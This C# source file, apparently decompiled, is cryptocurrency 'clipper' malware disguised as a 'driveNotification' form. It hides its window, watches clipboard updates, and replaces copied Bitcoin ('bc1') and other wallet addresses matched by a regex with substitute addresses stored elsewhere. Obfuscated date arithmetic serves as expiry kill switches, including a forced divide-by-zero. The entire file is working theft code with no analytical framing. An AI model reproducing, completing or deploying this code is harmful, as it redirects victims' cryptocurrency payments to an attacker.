using System;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7;

public sealed class driveNotification
{
	public class NotificationForm : Form
	{
		[CompilerGenerated]
		private sealed class a
		{
			public string a;

			public void a()
			{
				this.a = Clipboard.GetText();
			}
		}

		[CompilerGenerated]
		private sealed class b
		{
			public string a;

			public void a()
			{
				Clipboard.SetText(this.a);
			}
		}

		private static string m_a;

		protected override CreateParams CreateParams
		{
			get
			{
				DateTime dateTime = new DateTime(-(-537597025 ^ 0x200B2B27) >> 3, 274862840 + 288957455 - 563820293, -(-61659334 - -693046450 + -631387340 >> 5) << 1, 620982503 - 620982492, ~((0x1A49124B ^ 0x1211EEC8) + -140049551), (-544075745 ^ -544075685) >> 2);
				if ((DateTime.Now - dateTime).TotalDays > 0.0)
				{
					throw new ArgumentException();
				}
				CreateParams createParams = ((Form)this).CreateParams;
				createParams.ExStyle |= 0x80;
				return createParams;
			}
		}

		public NotificationForm()
		{
			global::a.a.b(((Control)this).Handle, global::a.a.b);
			global::a.a.a(((Control)this).Handle);
		}

		private bool a(Regex a)
		{
			DateTime dateTime = new DateTime(~(-4052 >> 1), (~(--396483681) ^ 0x194899FF) + 250168737, -(-36491638 + 412810533) - -376319791 >> 6);
			if (dateTime < DateTime.Now && 0 == 0)
			{
				throw new ArgumentException();
			}
			if (a.Match(NotificationForm.m_a).Success)
			{
				return true;
			}
			return false;
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).Msg == 797)
			{
				NotificationForm.m_a = GetText();
				if (NotificationForm.m_a.StartsWith("bc1"))
				{
					if (a(global::a.ab) && !NotificationForm.m_a.Contains(global::a.aa))
					{
						string text = global::a.ab.Replace(NotificationForm.m_a, global::a.aa);
						SetText(text);
					}
				}
				else if (a(global::a.ab) && !NotificationForm.m_a.Contains(global::a.y))
				{
					string text2 = global::a.ab.Replace(NotificationForm.m_a, global::a.y);
					SetText(text2);
				}
			}
			((Form)this).WndProc(ref m);
		}

		public static string GetText()
		{
			string a = string.Empty;
			Thread thread = new Thread((ThreadStart)delegate
			{
				a = Clipboard.GetText();
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
			return a;
		}

		public static void SetText(string txt)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				Clipboard.SetText(txt);
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}

		static NotificationForm()
		{
			DateTime dateTime = new DateTime((354911372 << 1) + -526263332 - 183557387, -248582196 ^ -248582194, (-929595922 ^ -661630196) + -268906197, -(-1230828030 - -634833338) + -595994674, ~((-(~-1322754729) >> 3) - -165344309), -(-155085061 ^ 0x93E6905));
			if ((dateTime - DateTime.Now).TotalDays < 0.0)
			{
				int num = -356990282 ^ -356990282;
				num = (0xFAB026A ^ 0xFAB026B) / num;
			}
			NotificationForm.m_a = GetText();
		}
	}
}
